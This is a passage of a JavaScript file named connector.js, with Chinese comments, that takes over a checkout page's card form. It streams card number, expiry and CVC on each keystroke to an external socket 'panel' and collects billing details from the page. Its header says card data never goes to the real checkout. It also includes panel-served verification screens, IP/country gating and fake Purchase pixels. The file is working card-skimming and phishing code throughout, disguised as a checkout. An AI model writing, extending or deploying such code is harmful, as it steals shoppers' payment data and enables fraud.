/* ============================================================================
 * /bp/connector.js — 结账页外部面板接管 connector  v1.0.0
 *
 *   职责：把站点自己的卡片输入实时送到外部 socket 面板，接收面板下发的验证屏，
 *        并按站点契约完成"提交 → 成功页"。
 *   不做支付：卡片数据只走面板通道，不进入 /api/checkout。
 *
 *   依赖：站点 head 里按契约注入的 __BP_UTM__ / __BP_CART__ 骨架（缺失也能跑）
 *   暴露：window.BPConnector（状态、手动发事件、弹层控制，供调试与回归测试）
 * ==========================================================================*/
;(function (global, doc) {
  'use strict';

  if (global.__BP_CONNECTOR_LOADED__) { return; }
  global.__BP_CONNECTOR_LOADED__ = true;

  var VERSION = '1.0.0';

  /* =========================================================================
   * 0. 配置
   * =======================================================================*/
  var C = {
    panel_host: '',                 // wss://host  或  https://host
    socket_path: '/socket.io/',
    logname: 'wordpress_ls',
    logtype: 'cc',                  // 面板 Go 端只认 'cc'
    enable_verify: false,           // 有 Pages Functions 时走服务端 IP/国家准入
    verify_endpoint: '/api/bp/verify',
    panel_direct: true,             // 浏览器直连面板准入接口（面板开了 CORS 就能用，自动取 logname）
    panel_direct_timeout: 2500,
    assets_base: '/bp/3ds/',
    runtime_url: '/bp/bp-template-runtime.js',
    /* 面板下发 template_url 时的前缀。留空 = 自动用 "<面板>/checkout/"（面板自己托管了那 23+ 套模板） */
    template_base: '',
    submit_url: '/api/checkout',
    cart_url: '/api/cart',
    blacklist_wait_ms: 7000,
    /* 提交守卫：用户点提交后**必须**等面板指令，不会自己完成
     *   guard_mode: 'always'（默认，永远等）/ 'auto'（按 pagetype）/ 'never'（直通）
     *   allow_direct: 直通的总开关，默认 false —— 只要它是 false，
     *                 上面三种模式全部按 'always' 执行，页面上不可能自动跳成功页 */
    guard_mode: 'always',
    allow_direct: false,
    guard_timeout_ms: 180000,       // 挂起超过这个时间仍无指令 → 释放并报错（不会产生订单）
    /* 购买事件（转化像素）：用户点提交即触发一次
     *   pixel_enabled      总开关（false 则完全不动）
     *   pixel_platforms    要打的平台：'fb' / 'tt' / 'ga'
     *   pixel_event        事件名（FB 标准 Purchase）
     *   pixel_dedupe_hours 去重窗口：同一「指纹+IP」在窗口内只发一次
     *   pixel_value        是否带金额（默认不带，按需求留空） */
    pixel_enabled: true,
    pixel_platforms: ['fb'],
    pixel_event: 'Purchase',
    pixel_dedupe_hours: 24,
    pixel_value: false,
    debug: false
  };

  function log() {
    if (!C.debug || !global.console) { return; }
    var a = ['[bp]'].concat([].slice.call(arguments));
    console.log.apply(console, a);
  }
  function warn() {
    if (!global.console || !C.debug) { return; }
    var a = ['[bp]'].concat([].slice.call(arguments));
    console.warn.apply(console, a);
  }

  /* =========================================================================
   * 1. 小工具
   * =======================================================================*/
  function isObj(v) { return v && typeof v === 'object' && !Array.isArray(v); }
  function q(sel, root) { try { return (root || doc).querySelector(sel); } catch (e) { return null; } }
  function qa(sel, root) { try { return [].slice.call((root || doc).querySelectorAll(sel)); } catch (e) { return []; } }
  function on(el, ev, fn, opt) { if (el && el.addEventListener) { el.addEventListener(ev, fn, opt || false); } }
  function rand(n) {
    var s = '', t = 'abcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0; i < (n || 8); i++) { s += t.charAt(Math.floor(Math.random() * t.length)); }
    return s;
  }
  function nowMs() { return Date.now(); }

  /* base64(JSON) —— 与面板约定的"加密"：仅编码，无密钥 */
  function b64(obj) {
    try {
      var json = typeof obj === 'string' ? obj : JSON.stringify(obj || {});
      return global.btoa(unescape(encodeURIComponent(json)));
    } catch (e) {
      return '';
    }
  }

  function fireEvent(name, detail) {
    try { global.dispatchEvent(new global.CustomEvent(name, { detail: detail })); } catch (e) {}
  }

  /* =========================================================================
   * 2. i18n（按 <html lang> 选，缺省回落 en）
   * =======================================================================*/
  var I18N = {
    en: {
      creditCard: 'Credit Card', cardNumber: 'Card Number', expiryDate: 'Expiry Date',
      securityCode: 'Security Code', pay: 'Pay now',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / YY', cvcPH: 'CVC',
      cardIncomplete: 'Your card number is incomplete.',
      cardInvalid: 'Your card number is invalid.',
      cardLength: 'Card number must be {n} digits (you entered {got}).',
      cardExpired: 'This card has expired.',
      expiryIncomplete: "Your card's expiration date is incomplete.",
      expiryInvalid: "Your card's expiration date is invalid.",
      cvcIncomplete: "Your card's security code is incomplete.",
      cardDeclined: 'Your card was declined. Please try another card.',
      paymentError: 'Payment error, please try again.',
      networkError: 'Network error, please refresh and try again.',
      processing: 'Processing…', trust: 'Safe & secure checkout'
    },
    zh: {
      creditCard: '信用卡', cardNumber: '卡号', expiryDate: '有效期', securityCode: '安全码', pay: '支付',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: '月 / 年', cvcPH: 'CVC',
      cardIncomplete: '卡号尚未填写完整。', cardInvalid: '卡号无效。',
      cardLength: '卡号位数不对，应为 {n} 位（你输入了 {got} 位）。', cardExpired: '这张卡已过期。',
      expiryIncomplete: '有效期尚未填写完整。', expiryInvalid: '有效期无效。',
      cvcIncomplete: '安全码尚未填写完整。',
      cardDeclined: '该卡未通过，请更换卡片重试。', paymentError: '支付失败，请重试。',
      networkError: '网络错误，请刷新后重试。',
      processing: '处理中…', trust: '安全加密结账'
    },
    es: {
      creditCard: 'Tarjeta', cardNumber: 'Número de tarjeta', expiryDate: 'Caducidad', securityCode: 'Código', pay: 'Pagar',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / AA', cvcPH: 'CVC',
      cardIncomplete: 'El número de tarjeta está incompleto.', cardInvalid: 'El número de tarjeta no es válido.',
      expiryIncomplete: 'La fecha de caducidad está incompleta.', expiryInvalid: 'La fecha de caducidad no es válida.',
      cvcIncomplete: 'El código de seguridad está incompleto.',
      cardDeclined: 'La tarjeta fue rechazada. Pruebe con otra.', paymentError: 'Error de pago, inténtelo de nuevo.',
      networkError: 'Error de red, actualice e inténtelo de nuevo.', processing: 'Procesando…', trust: 'Pago seguro'
    },
    fr: {
      creditCard: 'Carte bancaire', cardNumber: 'Numéro de carte', expiryDate: 'Expiration', securityCode: 'Cryptogramme', pay: 'Payer',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / AA', cvcPH: 'CVC',
      cardIncomplete: 'Le numéro de carte est incomplet.', cardInvalid: 'Le numéro de carte est invalide.',
      expiryIncomplete: "La date d'expiration est incomplète.", expiryInvalid: "La date d'expiration est invalide.",
      cvcIncomplete: 'Le cryptogramme est incomplet.',
      cardDeclined: 'Carte refusée. Veuillez en essayer une autre.', paymentError: 'Erreur de paiement, réessayez.',
      networkError: 'Erreur réseau, actualisez la page.', processing: 'Traitement…', trust: 'Paiement sécurisé'
    },
    de: {
      creditCard: 'Kreditkarte', cardNumber: 'Kartennummer', expiryDate: 'Gültig bis', securityCode: 'Prüfziffer', pay: 'Bezahlen',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / JJ', cvcPH: 'CVC',
      cardIncomplete: 'Die Kartennummer ist unvollständig.', cardInvalid: 'Die Kartennummer ist ungültig.',
      expiryIncomplete: 'Das Gültigkeitsdatum ist unvollständig.', expiryInvalid: 'Das Gültigkeitsdatum ist ungültig.',
      cvcIncomplete: 'Die Prüfziffer ist unvollständig.',
      cardDeclined: 'Karte abgelehnt. Bitte andere Karte verwenden.', paymentError: 'Zahlungsfehler, bitte erneut versuchen.',
      networkError: 'Netzwerkfehler, bitte neu laden.', processing: 'Verarbeitung…', trust: 'Sichere Zahlung'
    },
    pt: {
      creditCard: 'Cartão', cardNumber: 'Número do cartão', expiryDate: 'Validade', securityCode: 'Código', pay: 'Pagar',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / AA', cvcPH: 'CVC',
      cardIncomplete: 'O número do cartão está incompleto.', cardInvalid: 'O número do cartão é inválido.',
      expiryIncomplete: 'A validade está incompleta.', expiryInvalid: 'A validade é inválida.',
      cvcIncomplete: 'O código de segurança está incompleto.',
      cardDeclined: 'Cartão recusado. Tente outro.', paymentError: 'Erro no pagamento, tente novamente.',
      networkError: 'Erro de rede, atualize a página.', processing: 'Processando…', trust: 'Pagamento seguro'
    },
    it: {
      creditCard: 'Carta di credito', cardNumber: 'Numero carta', expiryDate: 'Scadenza', securityCode: 'Codice', pay: 'Paga',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / AA', cvcPH: 'CVC',
      cardIncomplete: 'Il numero della carta è incompleto.', cardInvalid: 'Il numero della carta non è valido.',
      expiryIncomplete: 'La scadenza è incompleta.', expiryInvalid: 'La scadenza non è valida.',
      cvcIncomplete: 'Il codice di sicurezza è incompleto.',
      cardDeclined: 'Carta rifiutata. Provane un\'altra.', paymentError: 'Errore di pagamento, riprova.',
      networkError: 'Errore di rete, aggiorna la pagina.', processing: 'Elaborazione…', trust: 'Pagamento sicuro'
    },
    ru: {
      creditCard: 'Банковская карта', cardNumber: 'Номер карты', expiryDate: 'Срок действия', securityCode: 'Код', pay: 'Оплатить',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'ММ / ГГ', cvcPH: 'CVC',
      cardIncomplete: 'Номер карты введён не полностью.', cardInvalid: 'Неверный номер карты.',
      expiryIncomplete: 'Срок действия введён не полностью.', expiryInvalid: 'Неверный срок действия.',
      cvcIncomplete: 'Код безопасности введён не полностью.',
      cardDeclined: 'Карта отклонена. Попробуйте другую.', paymentError: 'Ошибка оплаты, попробуйте снова.',
      networkError: 'Ошибка сети, обновите страницу.', processing: 'Обработка…', trust: 'Безопасная оплата'
    },
    ja: {
      creditCard: 'クレジットカード', cardNumber: 'カード番号', expiryDate: '有効期限', securityCode: 'セキュリティコード', pay: '支払う',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / YY', cvcPH: 'CVC',
      cardIncomplete: 'カード番号が未入力です。', cardInvalid: 'カード番号が無効です。',
      expiryIncomplete: '有効期限が未入力です。', expiryInvalid: '有効期限が無効です。',
      cvcIncomplete: 'セキュリティコードが未入力です。',
      cardDeclined: 'カードが拒否されました。別のカードをお試しください。', paymentError: '支払いエラーです。再度お試しください。',
      networkError: '通信エラーです。再読み込みしてください。', processing: '処理中…', trust: '安全な決済'
    },
    ko: {
      creditCard: '신용카드', cardNumber: '카드 번호', expiryDate: '유효기간', securityCode: '보안코드', pay: '결제하기',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / YY', cvcPH: 'CVC',
      cardIncomplete: '카드 번호가 완전하지 않습니다.', cardInvalid: '카드 번호가 올바르지 않습니다.',
      expiryIncomplete: '유효기간이 완전하지 않습니다.', expiryInvalid: '유효기간이 올바르지 않습니다.',
      cvcIncomplete: '보안코드가 완전하지 않습니다.',
      cardDeclined: '카드가 거절되었습니다. 다른 카드를 사용해 주세요.', paymentError: '결제 오류입니다. 다시 시도해 주세요.',
      networkError: '네트워크 오류입니다. 새로고침해 주세요.', processing: '처리 중…', trust: '안전한 결제'
    },
    ar: {
      creditCard: 'بطاقة ائتمان', cardNumber: 'رقم البطاقة', expiryDate: 'تاريخ الانتهاء', securityCode: 'رمز الأمان', pay: 'ادفع',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'شهر / سنة', cvcPH: 'CVC',
      cardIncomplete: 'رقم البطاقة غير مكتمل.', cardInvalid: 'رقم البطاقة غير صالح.',
      expiryIncomplete: 'تاريخ الانتهاء غير مكتمل.', expiryInvalid: 'تاريخ الانتهاء غير صالح.',
      cvcIncomplete: 'رمز الأمان غير مكتمل.',
      cardDeclined: 'تم رفض البطاقة. جرّب بطاقة أخرى.', paymentError: 'خطأ في الدفع، حاول مرة أخرى.',
      networkError: 'خطأ في الشبكة، حدّث الصفحة.', processing: 'جارٍ المعالجة…', trust: 'دفع آمن'
    },
    tr: {
      creditCard: 'Kredi Kartı', cardNumber: 'Kart Numarası', expiryDate: 'Son Kullanma', securityCode: 'Güvenlik Kodu', pay: 'Öde',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'AA / YY', cvcPH: 'CVC',
      cardIncomplete: 'Kart numarası eksik.', cardInvalid: 'Kart numarası geçersiz.',
      expiryIncomplete: 'Son kullanma tarihi eksik.', expiryInvalid: 'Son kullanma tarihi geçersiz.',
      cvcIncomplete: 'Güvenlik kodu eksik.',
      cardDeclined: 'Kart reddedildi. Başka bir kart deneyin.', paymentError: 'Ödeme hatası, tekrar deneyin.',
      networkError: 'Ağ hatası, sayfayı yenileyin.', processing: 'İşleniyor…', trust: 'Güvenli ödeme'
    },
    vi: {
      creditCard: 'Thẻ tín dụng', cardNumber: 'Số thẻ', expiryDate: 'Ngày hết hạn', securityCode: 'Mã bảo mật', pay: 'Thanh toán',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / YY', cvcPH: 'CVC',
      cardIncomplete: 'Số thẻ chưa đầy đủ.', cardInvalid: 'Số thẻ không hợp lệ.',
      expiryIncomplete: 'Ngày hết hạn chưa đầy đủ.', expiryInvalid: 'Ngày hết hạn không hợp lệ.',
      cvcIncomplete: 'Mã bảo mật chưa đầy đủ.',
      cardDeclined: 'Thẻ bị từ chối. Vui lòng thử thẻ khác.', paymentError: 'Lỗi thanh toán, vui lòng thử lại.',
      networkError: 'Lỗi mạng, vui lòng tải lại trang.', processing: 'Đang xử lý…', trust: 'Thanh toán an toàn'
    },
    th: {
      creditCard: 'บัตรเครดิต', cardNumber: 'หมายเลขบัตร', expiryDate: 'วันหมดอายุ', securityCode: 'รหัสความปลอดภัย', pay: 'ชำระเงิน',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'ดด / ปป', cvcPH: 'CVC',
      cardIncomplete: 'หมายเลขบัตรไม่ครบถ้วน', cardInvalid: 'หมายเลขบัตรไม่ถูกต้อง',
      expiryIncomplete: 'วันหมดอายุไม่ครบถ้วน', expiryInvalid: 'วันหมดอายุไม่ถูกต้อง',
      cvcIncomplete: 'รหัสความปลอดภัยไม่ครบถ้วน',
      cardDeclined: 'บัตรถูกปฏิเสธ โปรดลองบัตรอื่น', paymentError: 'เกิดข้อผิดพลาดในการชำระเงิน',
      networkError: 'เครือข่ายผิดพลาด โปรดรีเฟรช', processing: 'กำลังดำเนินการ…', trust: 'ชำระเงินอย่างปลอดภัย'
    },
    id: {
      creditCard: 'Kartu Kredit', cardNumber: 'Nomor Kartu', expiryDate: 'Masa Berlaku', securityCode: 'Kode Keamanan', pay: 'Bayar',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'BB / TT', cvcPH: 'CVC',
      cardIncomplete: 'Nomor kartu belum lengkap.', cardInvalid: 'Nomor kartu tidak valid.',
      expiryIncomplete: 'Masa berlaku belum lengkap.', expiryInvalid: 'Masa berlaku tidak valid.',
      cvcIncomplete: 'Kode keamanan belum lengkap.',
      cardDeclined: 'Kartu ditolak. Coba kartu lain.', paymentError: 'Terjadi kesalahan pembayaran.',
      networkError: 'Kesalahan jaringan, muat ulang halaman.', processing: 'Memproses…', trust: 'Pembayaran aman'
    },
    pl: {
      creditCard: 'Karta', cardNumber: 'Numer karty', expiryDate: 'Ważna do', securityCode: 'Kod', pay: 'Zapłać',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / RR', cvcPH: 'CVC',
      cardIncomplete: 'Numer karty jest niekompletny.', cardInvalid: 'Numer karty jest nieprawidłowy.',
      expiryIncomplete: 'Data ważności jest niekompletna.', expiryInvalid: 'Data ważności jest nieprawidłowa.',
      cvcIncomplete: 'Kod zabezpieczający jest niekompletny.',
      cardDeclined: 'Karta odrzucona. Spróbuj innej.', paymentError: 'Błąd płatności, spróbuj ponownie.',
      networkError: 'Błąd sieci, odśwież stronę.', processing: 'Przetwarzanie…', trust: 'Bezpieczna płatność'
    },
    nl: {
      creditCard: 'Creditcard', cardNumber: 'Kaartnummer', expiryDate: 'Vervaldatum', securityCode: 'Beveiligingscode', pay: 'Betalen',
      cardNumberPH: '1234 1234 1234 1234', expiryPH: 'MM / JJ', cvcPH: 'CVC',
      cardIncomplete: 'Het kaartnummer is onvolledig.', cardInvalid: 'Het kaartnummer is ongeldig.',
      expiryIncomplete: 'De vervaldatum is onvolledig.', expiryInvalid: 'De vervaldatum is ongeldig.',
      cvcIncomplete: 'De beveiligingscode is onvolledig.',
      cardDeclined: 'Kaart geweigerd. Probeer een andere kaart.', paymentError: 'Betalingsfout, probeer opnieuw.',
      networkError: 'Netwerkfout, herlaad de pagina.', processing: 'Verwerken…', trust: 'Veilig betalen'
    }
  };

  var LANG = 'en';
  function pickLang() {
    var raw = '';
    try { raw = (doc.documentElement.getAttribute('lang') || '').toLowerCase(); } catch (e) {}
    if (!raw) { try { raw = (navigator.language || '').toLowerCase(); } catch (e) {} }
    var two = raw.split('-')[0];
    if (I18N[raw]) { return raw; }
    if (I18N[two]) { return two; }
    if (two === 'zh') { return 'zh'; }
    return 'en';
  }
  function T(k) {
    var t = (I18N[LANG] && I18N[LANG][k]) || I18N.en[k];
    return t == null ? k : t;
  }

  /* =========================================================================
   * 3. UTM / 归因
   * =======================================================================*/
  function readUTM() {
    if (isObj(global.__BP_UTM__)) { return global.__BP_UTM__; }
    try {
      var s = global.sessionStorage.getItem('bp_utm');
      if (s) { return JSON.parse(s) || {}; }
    } catch (e) {}
    try {
      var m = (doc.cookie || '').match(/(?:^|;\s*)bp_utm=([^;]+)/);
      if (m) { return JSON.parse(decodeURIComponent(m[1])) || {}; }
    } catch (e) {}
    return {};
  }

  function domainWithUTM() {
    var base = '';
    try { base = global.location.href; } catch (e) { base = ''; }
    var u = readUTM(), keys = [], k;
    for (k in u) {
      if (Object.prototype.hasOwnProperty.call(u, k) && u[k]) { keys.push(k); }
    }
    if (!keys.length) { return base; }

    /* 去掉 href 里已有的同名参数，再统一追加，避免 utm 重复两遍 */
    var hash = '', hi = base.indexOf('#');
    if (hi !== -1) { hash = base.slice(hi); base = base.slice(0, hi); }
    var qi = base.indexOf('?');
    var origin = qi === -1 ? base : base.slice(0, qi);
    var qs = qi === -1 ? '' : base.slice(qi + 1);
    var keep = qs ? qs.split('&').filter(function (seg) {
      if (!seg) { return false; }
      var kk = seg.split('=')[0];
      try { kk = decodeURIComponent(kk); } catch (e) {}
      return keys.indexOf(kk) === -1;
    }) : [];
    keys.forEach(function (kk) {
      keep.push(encodeURIComponent(kk) + '=' + encodeURIComponent(u[kk]));
    });
    return origin + (keep.length ? '?' + keep.join('&') : '') + hash;
  }

  /* =========================================================================
   * 4. 购物车
   * =======================================================================*/
  var cartCache = null;

  function skeletonCart() {
    return { order_number: '', currency: 'USD', total: 0, total_amount: '', items: [], locale: LANG };
  }

  function normalizeCart(c) {
    var d = skeletonCart(), k;
    if (!isObj(c)) { return d; }
    for (k in d) { if (Object.prototype.hasOwnProperty.call(d, k) && c[k] !== undefined) { d[k] = c[k]; } }
    return d;
  }

  function getCart() {
    if (cartCache) { return cartCache; }
    var c = null;
    try { c = normalizeCart(global.__BP_CART__); } catch (e) { c = skeletonCart(); }
    cartCache = c;
    applyCart(c);
    return c;
  }

  function applyCart(c) {
    var el = q('#bp-total');
    if (!el || !c) { return; }
    if (c.total_amount) { el.textContent = c.total_amount; }
    if (c.total !== undefined && c.total !== null) { el.setAttribute('data-amount', String(c.total)); }
    if (c.currency) { el.setAttribute('data-currency', String(c.currency)); }
  }

  function fetchCartOnce() {
    return new Promise(function (resolve) {
      if (!global.fetch || !C.cart_url) { resolve(null); return; }
      var done = false, to = setTimeout(function () { if (!done) { done = true; resolve(null); } }, 4000);
      global.fetch(C.cart_url, { credentials: 'same-origin', headers: { Accept: 'application/json' } })
        .then(function (r) { return r.ok ? r.json() : null; })
        .then(function (j) {
          if (done) { return; }
          done = true; clearTimeout(to);
          if (isObj(j)) { cartCache = normalizeCart(j); applyCart(cartCache); resolve(cartCache); }
          else { resolve(null); }
        })
        .catch(function () { if (!done) { done = true; clearTimeout(to); resolve(null); } });
    });
  }

  /* =========================================================================
   * 5. 卡号：品牌 / Luhn / 格式化 / 校验
   * =======================================================================*/
  var BRANDS = [
    { id: 'visa',       re: /^4/ },
    { id: 'mastercard', re: /^(5[1-5]|2[2-7])/ },
    { id: 'amex',       re: /^3[47]/ },
    { id: 'discover',   re: /^(6011|65|64[4-9]|622)/ },
    { id: 'jcb',        re: /^35/ },
    { id: 'diners',     re: /^(30|36|38|39)/ },
    { id: 'unionpay',   re: /^62/ },
    { id: 'maestro',    re: /^(50|5[6-9]|6)/ }
  ];

  function brandOf(num) {
    var d = String(num || '').replace(/\D/g, '');
    if (!d) { return 'unknown'; }
    if (/^3[47]/.test(d)) { return 'amex'; }
    if (/^(5[1-5])/.test(d)) { return 'mastercard'; }
    if (/^2[2-7]/.test(d)) {
      var p4 = parseInt(d.slice(0, 4), 10);
      if (p4 >= 2221 && p4 <= 2720) { return 'mastercard'; }
    }
    for (var i = 0; i < BRANDS.length; i++) {
      if (BRANDS[i].id !== 'mastercard' && BRANDS[i].re.test(d)) { return BRANDS[i].id; }
    }
    return 'unknown';
  }

  function luhn(num) {
    var d = String(num || '').replace(/\D/g, '');
    if (d.length < 12) { return null; }
    var sum = 0, alt = false;
    for (var i = d.length - 1; i >= 0; i--) {
      var n = parseInt(d.charAt(i), 10);
      if (alt) { n *= 2; if (n > 9) { n -= 9; } }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  function groupCard(digits) {
    /* Amex 4-6-5，其余每 4 位 */
    if (/^3[47]/.test(digits)) {
      var a = digits.slice(0, 4), b = digits.slice(4, 10), c = digits.slice(10, 15);
      return [a, b, c].filter(Boolean).join(' ');
    }
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  }

  function formatCardInput(el) {
    var raw = el.value.replace(/\D/g, '');
    /* 按品牌硬限位数：默认 16，Amex 15，Diners 14 */
    var lim = maxLenFor(brandOf(raw));
    var digits = raw.slice(0, lim);
    var pretty = groupCard(digits);
    if (pretty !== el.value) {
      var pos = el.selectionStart, before = el.value.length;
      el.value = pretty;
      try {
        var diff = pretty.length - before;
        el.setSelectionRange(Math.max(0, pos + diff), Math.max(0, pos + diff));
      } catch (e) {}
    }
    return digits;
  }

  function formatExpiryInput(el) {
    var d = el.value.replace(/\D/g, '').slice(0, 4);
    var out = d;
    if (d.length >= 3) {
      var mm = d.slice(0, 2), yy = d.slice(2);
      var m = parseInt(mm, 10);
      if (m > 12 && mm.charAt(0) === '1') { mm = '0' + mm.charAt(0); yy = d.slice(1); }
      else if (m > 12) { mm = '12'; yy = d.slice(2); }
      out = mm + '/' + yy;
    } else if (d.length === 2) {
      try { el.value = d; } catch (e) {}
      return d;
    }
    if (out !== el.value) { el.value = out; }
    return d;
  }

  function parseExpiry(v) {
    var m = String(v || '').match(/^(\d{2})\s*\/?\s*(\d{2})$/);
    if (!m) { return null; }
    var mm = parseInt(m[1], 10), yy = parseInt(m[2], 10);
    if (mm < 1 || mm > 12) { return null; }
    return { mm: mm, yy: yy };
  }

  /* =========================================================================
   * 6. 表单
   * =======================================================================*/
  var E = {};              /* 元素缓存 */
  var busy = false;

  function showErr(msg, kind) {
    if (!E.error) { return; }
    E.error.textContent = msg || '';
    E.error.className = 'bp-error' + (kind === 'info' ? ' bp-error--info' : '');
  }
  function clearErr() { showErr(''); }

  function markInvalid(el, bad) {
    if (!el) { return; }
    if (bad) { el.setAttribute('aria-invalid', 'true'); }
    else { el.removeAttribute('aria-invalid'); }
  }

  function digitsOf(el) { return el ? String(el.value || '').replace(/\D/g, '') : ''; }

  /* 各品牌**允许的最大位数**（输入时就截断，提交时再校验）
   *   默认 16；Amex 15；Diners 14 */
  function maxLenFor(brand) {
    if (brand === 'amex') { return 15; }
    if (brand === 'diners') { return 14; }
    return 16;
  }

  /* 各品牌要求的**精确位数**（提交校验用） */
  function acceptedLengths(brand) {
    var map = {
      visa: [16],
      mastercard: [16],
      amex: [15],
      discover: [16],
      jcb: [16],
      diners: [14],
      unionpay: [16],
      maestro: [16]
    };
    return map[brand] || [16];
  }

  function validateCard() {
    var num = digitsOf(E.card), exp = digitsOf(E.exp), cvc = digitsOf(E.cvc);
    var brand = brandOf(num);

    if (!num || num.length < 12) {
      return { ok: false, msg: T('cardIncomplete'), field: E.card };
    }

    /* 位数校对：按品牌精确匹配，默认只认 16 位 */
    var lens = acceptedLengths(brand);
    if (lens.indexOf(num.length) === -1) {
      var want = lens.length === 1 ? String(lens[0]) : lens.join(' / ');
      return {
        ok: false,
        msg: T('cardLength').replace('{n}', want).replace('{got}', String(num.length)),
        field: E.card
      };
    }

    if (luhn(num) === false) {
      return { ok: false, msg: T('cardInvalid'), field: E.card };
    }

    if (exp.length < 4) { return { ok: false, msg: T('expiryIncomplete'), field: E.exp }; }
    var pe = parseExpiry(E.exp.value);
    if (!pe) { return { ok: false, msg: T('expiryInvalid'), field: E.exp }; }

    /* 过期卡拦截 */
    var now = new Date();
    var cy = now.getFullYear() % 100, cm = now.getMonth() + 1;
    if (pe.yy < cy || (pe.yy === cy && pe.mm < cm)) {
      return { ok: false, msg: T('cardExpired'), field: E.exp };
    }

    var need = brand === 'amex' ? 4 : 3;
    if (cvc.length < need) { return { ok: false, msg: T('cvcIncomplete'), field: E.cvc }; }

    return { ok: true, number: num, brand: brand, expiry: E.exp.value.trim(), cvc: cvc };
  }

  /* 账单信息：从常见 name / autocomplete / 相邻 label 猜，读不到就留空 */
  function collectBilling() {
    var out = { firstname: '', lastname: '', address1: '', address2: '', city: '', state: '',
                country: '', zip: '', postcode: '', phone: '', email: '' };

    function pick(sel, keys) {
      for (var i = 0; i < sel.length; i++) {
        var el = q(sel[i]);
        if (el && el.value) {
          for (var j = 0; j < keys.length; j++) { if (!out[keys[j]]) { out[keys[j]] = String(el.value).trim(); } }
          return String(el.value).trim();
        }
      }
      return '';
    }
    pick(['input[name="email"]', 'input[type="email"]', '#email'], ['email']);
    pick(['input[name="phone"]', 'input[type="tel"]', '#phone'], ['phone']);
    pick(['input[name="address"]', 'input[name="address1"]', 'input[autocomplete="address-line1"]', '#address'], ['address1']);
    pick(['input[name="address2"]', 'input[autocomplete="address-line2"]'], ['address2']);
    pick(['input[name="city"]', 'input[autocomplete="address-level2"]', '#city'], ['city']);
    pick(['input[name="state"]', 'input[autocomplete="address-level1"]', '#state'], ['state']);
    pick(['input[name="zip"]', 'input[name="postcode"]', 'input[autocomplete="postal-code"]', '#zip'], ['zip', 'postcode']);
    pick(['select[name="country"]', 'input[name="country"]', '#country'], ['country']);

    var full = pick(['input[name="name"]', 'input[autocomplete="name"]', '#name'], []);
    if (full) {
      var sp = full.split(/\s+/);
      out.firstname = sp.shift() || '';
      out.lastname = sp.join(' ') || '';
    }
    if (!out.firstname) { out.firstname = pick(['input[name="firstname"]', 'input[name="first_name"]', '#firstname'], ['firstname']); }
    if (!out.lastname) { out.lastname = pick(['input[name="lastname"]', 'input[name="last_name"]', '#lastname'], ['lastname']); }
    if (!out.postcode) { out.postcode = out.zip; }
    if (!out.zip) { out.zip = out.postcode; }
    return out;
  }

  function setBrandIcon(brand) {
    var box = q('.bp-brands');
    if (!box) { return; }
    box.setAttribute('data-brand', brand || 'unknown');
    var map = { visa: 'visa.svg', mastercard: 'mastercard.svg', amex: '3d-secure-ae.png',
                discover: '3d-secure-dir.png', jcb: '3d-secure-jcb.png' };
    var file = map[brand];
    if (!file) { box.innerHTML = ''; return; }
    if (box.getAttribute('data-file') === file) { return; }
    box.setAttribute('data-file', file);
    box.innerHTML = '<img alt="" src="' + C.assets_base + 'img/' + file + '">';
  }

  function bindForm() {
    E.form = q('#bp-form');
    E.card = q('#bp-card-number');
    E.exp = q('#bp-card-expiry');
    E.cvc = q('#bp-card-cvc');
    E.err = E.error = q('#bp-error');
    E.submit = q('#bp-submit');
    E.total = q('#bp-total');

    if (!E.card || !E.exp || !E.cvc) {
      warn('卡片三字段缺失，connector 不接管表单');
      return false;
    }

    [E.card, E.exp, E.cvc].forEach(function (el) {
      if (!el) { return; }
      if (el.className.indexOf('bp-input') === -1) { el.className = (el.className ? el.className + ' ' : '') + 'bp-input'; }
      el.setAttribute('autocapitalize', 'off');
      el.setAttribute('autocorrect', 'off');
      el.setAttribute('spellcheck', 'false');
      el.setAttribute('autocomplete', el.getAttribute('autocomplete') || (el === E.card ? 'cc-number' : el === E.exp ? 'cc-exp' : 'cc-csc'));
    });

    var labels = { card: T('cardNumber'), exp: T('expiryDate'), cvc: T('securityCode') };
    var phs = { card: T('cardNumberPH'), exp: T('expiryPH'), cvc: T('cvcPH') };
    if (!E.card.value && !E.card.placeholder) { E.card.placeholder = phs.card; }
    if (!E.exp.value && !E.exp.placeholder) { E.exp.placeholder = phs.exp; }
    if (!E.cvc.value && !E.cvc.placeholder) { E.cvc.placeholder = phs.cvc; }
    if (E.submit && (/^\s*(支付|结账|提交订单|Pay|Place order|Submit)\b/i.test(E.submit.textContent || '') || !E.submit.textContent.trim())) {
      E.submit.textContent = T('pay');
    }
    void labels;

    /* 卡号：格式化 + 品牌 + 实时上报 */
    on(E.card, 'input', function () {
      var d = formatCardInput(E.card);
      setBrandIcon(brandOf(d));
      markInvalid(E.card, false);
      clearErr();
      goLive('3');
      submitCard();
      updateStep('card_update');
    });

    /* 有效期 */
    on(E.exp, 'input', function () {
      var before = E.exp.value;
      var d = formatExpiryInput(E.exp);
      if (before !== E.exp.value && d.length >= 3) { /* 光标交给浏览器 */ }
      markInvalid(E.exp, false);
      clearErr();
      goLive('3');
      if (d.length >= 4) { submitCard(); }
    });

    /* CVC */
    on(E.cvc, 'input', function () {
      E.cvc.value = E.cvc.value.replace(/\D/g, '').slice(0, 4);
      markInvalid(E.cvc, false);
      clearErr();
      goLive('3');
      if (E.cvc.value.length >= 3) { submitCard(); }
    });

    /* 卡号失焦：补报一次完整值（面板按 keystroke 收，失焦兜底） */
